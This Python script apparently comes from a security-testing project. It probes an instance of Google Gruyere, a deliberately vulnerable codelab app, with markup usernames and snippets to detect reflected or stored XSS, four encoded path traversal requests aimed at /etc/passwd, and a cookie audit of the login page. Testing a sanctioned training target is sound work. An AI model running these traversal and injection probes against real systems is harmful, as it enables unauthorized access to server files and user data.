#!/usr/bin/env python3
"""IV-13 Phase 5: google-gruyere.appspot.com (sanctioned Google codelab app).
Instance discovered via /start. Independent probes:
(1) signup with markup username -> stored/reflected XSS check
(2) snippet post XSS (if authed)
(3) path traversal probes (encoded ../)
(4) cookie audit (role forging surface)
stdlib only."""
import json, os, re, time, ssl, urllib.request, urllib.parse, urllib.error, http.cookiejar
from html.parser import HTMLParser

INST = '399537805906358592369366415027868878530'
BASE = 'https://google-gruyere.appspot.com/' + INST
UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 IV13-IndependentVerifier/1.0'
CTX = ssl.create_default_context()
OUT = '/home/z/my-project/scripts/iv_out'
MARKUSER = 'iv13<u>m</u>'
MARKSNIP = 'iv13xss<b>s</b>'

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self.cur = None
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == 'form':
            self.cur = {'action': a.get('action'), 'method': (a.get('method') or 'GET').upper(), 'fields': []}
        elif self.cur is not None and tag in ('input', 'textarea', 'select', 'button'):
            self.cur['fields'].append({'tag': tag, 'type': a.get('type'), 'name': a.get('name'),
                                       'value': (a.get('value') or '')[:80], 'checked': a.get('checked')})
    def handle_endtag(self, tag):
        if tag == 'form' and self.cur:
            self.forms.append(self.cur)
            self.cur = None

def build(follow=True, jar=None):
    cj = jar or http.cookiejar.CookieJar()
    handlers = [urllib.request.HTTPCookieProcessor(cj),
                urllib.request.HTTPSHandler(context=CTX)]
    if not follow:
        handlers.append(NoRedirect())
    return urllib.request.build_opener(*handlers), cj

def req(opener, url, data=None, timeout=25):
    hdrs = {'User-Agent': UA, 'Accept': 'text/html,*/*;q=0.8', 'Referer': BASE + '/'}
    if data is not None:
        hdrs['Content-Type'] = 'application/x-www-form-urlencoded'
        data = urllib.parse.urlencode(data).encode()
    r = urllib.request.Request(url, data=data, headers=hdrs,
                               method='POST' if data is not None else 'GET')
    try:
        resp = opener.open(r, timeout=timeout)
        body = resp.read().decode('utf-8', 'replace')
        return {'status': resp.status, 'final': resp.geturl(),
                'headers': [(k, v) for k, v in resp.headers.items()], 'body': body, 'len': len(body)}
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', 'replace')
        return {'status': e.code, 'final': url,
                'headers': [(k, v) for k, v in e.headers.items()], 'body': body, 'len': len(body)}
    except Exception as e:
        return {'status': None, 'final': url, 'headers': [], 'body': '', 'len': 0, 'error': repr(e)[:150]}

results = {'instance': INST}

def note(k, v):
    results[k] = v
    print('##', k, json.dumps(v, ensure_ascii=False)[:400], flush=True)

# 1. signup page
op, cj = build(follow=False)
r = req(op, BASE + '/newaccount.gtl')
fp = FormParser()
fp.feed(r['body'])
note('signup_page', {'status': r['status'], 'len': r['len'], 'forms': fp.forms,
                     'set_cookie': [v for k, v in r['headers'] if k.lower() == 'set-cookie']})

# 2. signup with markup username
form = fp.forms[0] if fp.forms else None
if form:
    fields = {}
    for f in form['fields']:
        if f.get('name'):
            fields[f['name']] = f.get('value') or ''
    for k in list(fields.keys()):
        if k in ('uid', 'username'):
            fields[k] = MARKUSER
    for k in fields:
        if 'pass' in k.lower() and not fields[k]:
            fields[k] = 'Iv13Pass!9'
    action = form['action'] or '/newaccount.gtl'
    if action.startswith('http'):
        pass
    elif action.startswith('/'):
        action = 'https://google-gruyere.appspot.com' + action
    else:
        action = BASE + '/' + action
    op2, cj2 = build(follow=True)
    if form['method'] == 'GET':
        r2 = req(op2, action + '?' + urllib.parse.urlencode(fields))
    else:
        r2 = req(op2, action, data=fields)
    raw_refl = MARKUSER in r2['body']
    esc_refl = MARKUSER.replace('<', '&lt;') in r2['body']
    note('signup_post', {'action': form['action'], 'status': r2['status'], 'final': r2['final'],
                         'len': r2['len'], 'raw_markup_reflected': raw_refl,
                         'escaped': esc_refl,
                         'context': (r2['body'][max(0, r2['body'].find('iv13') - 60):r2['body'].find('iv13') + 120].replace('\n', ' ') if 'iv13' in r2['body'] else ''),
                         'cookies': [c.name + '=' + c.value[:40] for c in cj2]})
    # 3. home page with the same jar — stored XSS check for the username
    r3 = req(op2, BASE + '/')
    raw_refl3 = MARKUSER in r3['body']
    note('home_after_signup', {'status': r3['status'], 'len': r3['len'],
                               'stored_markup_raw': raw_refl3,
                               'context': (r3['body'][max(0, r3['body'].find('iv13') - 60):r3['body'].find('iv13') + 120].replace('\n', ' ') if 'iv13' in r3['body'] else ''),
                               'title': (re.search(r'<title>(.*?)</title>', r3['body'], re.S).group(1) if re.search(r'<title>(.*?)</title>', r3['body'], re.S) else None)})
    # 4. snippet post XSS attempt
    r4 = req(op2, BASE + '/snippets.gtl')
    fp2 = FormParser()
    fp2.feed(r4['body'])
    note('snippets_page', {'status': r4['status'], 'len': r4['len'],
                           'forms': [{'m': f['method'], 'a': f['action'],
                                      'names': [x['name'] for x in f['fields']]} for f in fp2.forms]})
    for f in fp2.forms:
        if f['method'] == 'POST':
            sfields = {x['name']: (x.get('value') or '') for x in f['fields'] if x.get('name')}
            for k in sfields:
                if sfields[k] == '' and ('snippet' in k.lower() or 'text' in k.lower() or 'content' in k.lower()):
                    sfields[k] = MARKSNIP
            sact = f['action'] or '/snippets.gtl'
            if sact.startswith('http'):
                pass
            elif sact.startswith('/'):
                sact = 'https://google-gruyere.appspot.com' + sact
            else:
                sact = BASE + '/' + sact
            r5 = req(op2, sact, data=sfields)
            note('snippet_post', {'status': r5['status'], 'final': r5['final'], 'len': r5['len'],
                                  'raw_markup_reflected': MARKSNIP in r5['body']})
            break

# 5. path traversal probes (encoded)
opT, _ = build(follow=False)
for path, label in [('..%2f..%2f..%2f..%2fetc%2fpasswd', 'trav-4up-passwd'),
                    ('.%2f.%2fetc%2fpasswd', 'trav-2up-passwd'),
                    ('..%252f..%252fetc%252fpasswd', 'trav-doubleslash'),
                    ('~%2f..%2f..%2fetc%2fpasswd', 'trav-tilde')]:
    rT = req(opT, BASE + '/' + path)
    leak = 'root:' in rT['body'] or ':/bin' in rT['body']
    note(label, {'status': rT['status'], 'len': rT['len'], 'passwd_content': leak,
                 'body_head': rT['body'][:120].replace('\n', ' ') if rT['body'] else ''})
    time.sleep(0.4)

# 6. cookie audit on login page
opL, cjL = build(follow=False)
rL = req(opL, BASE + '/login')
note('login_page_cookies', {'status': rL['status'],
                            'set_cookie': [v for k, v in rL['headers'] if k.lower() == 'set-cookie']})

with open(os.path.join(OUT, 'gruyere_probes.json'), 'w') as f:
    json.dump(results, f, indent=1, ensure_ascii=False)
print('\nsaved -> scripts/iv_out/gruyere_probes.json')
